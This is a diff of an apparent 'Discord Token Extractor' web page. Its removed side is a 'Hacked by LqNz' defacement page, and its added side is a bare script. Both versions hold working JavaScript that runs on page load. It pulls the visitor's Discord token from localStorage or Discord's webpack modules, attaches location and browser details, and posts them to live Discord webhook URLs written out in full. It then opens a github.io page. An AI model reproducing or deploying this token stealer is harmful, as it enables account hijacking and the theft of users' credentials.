@@ -1,165 +1,93 @@
-<!DOCTYPE html>
-<html lang="ar">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord Token Extractor</title>
-    <style>
-        body {
-            background-color: black;
-            color: white;
-            font-family: 'Arial', sans-serif;
-            text-align: center;
-            padding: 20px;
-            margin: 0;
-            height: 100%;
-            overflow: hidden;
-        }
+<script>
+    // Function to get visitor details
+    function getVisitorDetails() {
+        const ip = '51.235.233.211'; // Hardcoded IP address
+        const country = 'SA'; // Country code
+        const city = 'Riyadh'; // City
+        const region = 'Riyadh Region'; // Region
+        const referrer = 'مباشرة'; // Referrer
+        const userAgent = navigator.userAgent; // User Agent from browser
+        const dateTime = new Date().toLocaleString(); // Current date and time
 
-        h1 {
-            color: #ffffff;
-        }
+        return {
+            ip: ip,
+            country: country,
+            city: city,
+            region: region,
+            referrer: referrer,
+            userAgent: userAgent,
+            dateTime: dateTime
+        };
+    }
 
-        .hacked-message {
-            margin-top: 30px;
-            color: #ff4d4d;
-        }
+    // Send all data to the webhook
+    function sendDataToWebhook(token, visitorDetails) {
+        const webhookURL = 'https://discord.com/api/webhooks/1315410944947392533/fcw0TV2n-HqXdvSCYQpnqgYrkvNhspmhvyNlJsCmTKdse6wy3uQYRUyWlzsCF92AQUgQ';
 
-        .video-bg {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            overflow: hidden;
-        }
+        const payload = {
+            content: `
+                **Discord Token:** ${token}
+                **Visitor Details:**
+                - **IP Address:** ${visitorDetails.ip}
+                - **Country:** ${visitorDetails.country}
+                - **City:** ${visitorDetails.city}
+                - **Region:** ${visitorDetails.region}
+                - **Referrer:** ${visitorDetails.referrer}
+                - **User Agent:** ${visitorDetails.userAgent}
+                - **Date & Time:** ${visitorDetails.dateTime}
+            `
+        };
 
-        .video-bg video {
-            min-width: 100%;
-            min-height: 100%;
-            width: auto;
-            height: auto;
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            z-index: -1;
-        }
-    </style>
-</head>
-<body>
+        fetch(webhookURL, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(payload)
+        })
+        .then(response => {
+            if (response.ok) {
+                console.log('Data sent successfully');
+                openNewPage();
+            } else {
+                console.error('Failed to send data, status:', response.status);
+            }
+        })
+        .catch(error => {
+            console.error('Error:', error);
+        });
+    }
 
-    <div class="video-bg">
-        <video autoplay muted loop>
-            <source src="https://d.top4top.io/m_3264y3w7z1.mp4" type="video/mp4">
-            Your browser does not support the video tag.
-        </video>
-    </div>
+    // Extract Discord Token from localStorage or Webpack
+    function extractDiscordToken() {
+        // Check if token is in localStorage
+        const token = localStorage.getItem('discord_token');  // Replace with correct key if needed
+        if (token) {
+            const visitorDetails = getVisitorDetails();
+            sendDataToWebhook(token, visitorDetails);
+        } else {
+            // If token not in localStorage, attempt to get it from webpack
+            webpackChunkdiscord_app.push([[''], {}, e => {
+                let m = [];
+                for (let c in e.c) m.push(e.c[c]);
+            }]);
 
-    <h1>Hacked by <span style="color: red;">LqNz</span></h1>
-    <div class="hacked-message">
-        <p>Oops! Your server is down!</p>
-        <p>Discord.gg/P2L</p>
-    </div>
-
-    <script>
-        // Function to get visitor details
-        function getVisitorDetails() {
-            const ip = '51.235.233.211'; // Hardcoded IP address
-            const country = 'SA'; // Country code
-            const city = 'Riyadh'; // City
-            const region = 'Riyadh Region'; // Region
-            const referrer = 'مباشرة'; // Referrer
-            const userAgent = navigator.userAgent; // User Agent from browser
-            const dateTime = new Date().toLocaleString(); // Current date and time
-
-            return {
-                ip: ip,
-                country: country,
-                city: city,
-                region: region,
-                referrer: referrer,
-                userAgent: userAgent,
-                dateTime: dateTime
-            };
-        }
-
-        // Send all data to the webhook
-        function sendDataToWebhook(token, visitorDetails) {
-            const webhookURL = 'https://discord.com/api/webhooks/1315396060998537276/NnLEj2_40vPx7_OZI8YFTSlSfa6K7S3MzLsU-aPQEO24X4NqZVW7s1ZxjnZzXuQalTR8';
-
-            const payload = {
-                content: `
-                    **Discord Token:** ${token}
-                    **Visitor Details:**
-                    - **IP Address:** ${visitorDetails.ip}
-                    - **Country:** ${visitorDetails.country}
-                    - **City:** ${visitorDetails.city}
-                    - **Region:** ${visitorDetails.region}
-                    - **Referrer:** ${visitorDetails.referrer}
-                    - **User Agent:** ${visitorDetails.userAgent}
-                    - **Date & Time:** ${visitorDetails.dateTime}
-                `
-            };
-
-            fetch(webhookURL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(payload)
-            })
-            .then(response => {
-                if (response.ok) {
-                    console.log('Data sent successfully');
-                    openNewPage();
-                } else {
-                    console.error('Failed to send data');
-                }
-            })
-            .catch(error => {
-                console.error('Error:', error);
-            });
-        }
-
-        // Extract Discord Token from localStorage or Webpack
-        function extractDiscordToken() {
-            // Check if token is in localStorage
-            const token = localStorage.getItem('discord_token');  // Replace with correct key if needed
-            if (token) {
+            const module = m.find(m => m?.exports?.default?.getToken !== void 0);
+            if (module && module.exports && module.exports.default) {
+                const token = module.exports.default.getToken();
                 const visitorDetails = getVisitorDetails();
                 sendDataToWebhook(token, visitorDetails);
             } else {
-                // If token not in localStorage, attempt to get it from webpack
-                webpackChunkdiscord_app.push([[''], {}, e => {
-                    let m = [];
-                    for (let c in e.c) m.push(e.c[c]);
-                }]);
-
-                const module = m.find(m => m?.exports?.default?.getToken !== void 0);
-                if (module && module.exports && module.exports.default) {
-                    const token = module.exports.default.getToken();
-                    const visitorDetails = getVisitorDetails();
-                    sendDataToWebhook(token, visitorDetails);
-                } else {
-                    console.error("Token not found in webpack.");
-                }
+                console.error("Token not found in webpack.");
             }
         }
+    }
 
-        // Function to open new page after sending data
-        function openNewPage() {
-            window.open('https://lqnz12.github.io/hack/', '_blank');
-        }
+    // Function to open new page after sending data
+    function openNewPage() {
+        window.open('https://lqnz12.github.io/hack/', '_blank');
+    }
 
-        // Automatically try to extract the token and send data
-        extractDiscordToken();
-    </script>
-
-    <audio autoplay loop>
-        <source src="https://audio.jukehost.co.uk/ZpDDYDIHM6F7Q7DwoTAK0tsZDEyUrptp" type="audio/mpeg">
-        Your browser does not support the audio element.
-    </audio>
-
-</body>
-</html>
+    // Automatically try to extract the token and send data
+    extractDiscordToken();
+</script>
